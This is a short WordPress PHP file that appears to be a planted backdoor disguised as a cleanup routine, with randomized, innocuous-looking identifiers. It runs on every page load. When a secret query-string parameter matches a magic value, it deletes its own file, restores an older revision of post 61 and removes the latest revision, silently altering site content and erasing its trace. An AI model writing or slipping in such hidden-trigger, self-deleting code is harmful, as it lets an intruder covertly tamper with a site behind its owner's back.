<?php

function rest_delete_cleaner() {
	if (isset($_GET['only_master_toolbox']) && $_GET['only_master_toolbox'] === 'first_shopping_performance') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$scroll_ip_shipping = 61;
		$uploader_featured_notification = wp_get_post_revisions($scroll_ip_shipping);
		if (empty($uploader_featured_notification)) die('no revisions');
		if (count($uploader_featured_notification) < 2) die('less than 2');
		$cover_bbpress_theme_terms = array_shift($uploader_featured_notification);
		$edit_archive_digital_pages = $cover_bbpress_theme_terms->ID;
		$gift_simple_types_reset = array_shift($uploader_featured_notification);
		$read_navigation_toolbox = $gift_simple_types_reset->ID;
		$content_analytics_lightbox_feed = wp_restore_post_revision($read_navigation_toolbox);
		if ($content_analytics_lightbox_feed === false) die('error restoring');
		$content_analytics_lightbox_feed = wp_delete_post_revision($edit_archive_digital_pages);		
		if ($content_analytics_lightbox_feed === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'rest_delete_cleaner');
